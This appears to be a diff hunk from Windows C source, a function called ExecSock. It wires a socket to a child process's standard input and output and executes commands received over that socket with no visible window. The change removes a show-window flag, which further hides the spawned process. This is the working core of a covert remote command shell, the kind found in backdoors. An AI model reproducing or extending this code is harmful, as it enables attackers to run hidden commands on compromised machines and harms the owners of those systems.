@@ -15,7 +15,7 @@ void ExecSock(void)
 	PROCESS_INFORMATION pinfo;
 	memset(&sinfo, 0, sizeof(sinfo));
 	sinfo.cb = sizeof(sinfo);
-	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+	sinfo.dwFlags = STARTF_USESTDHANDLES;
     sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) sockfd;
 	if(CreateProcess(NULL, (LPSTR)recvbuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
 		WaitForSingleObject(pinfo.hProcess, INFINITE);
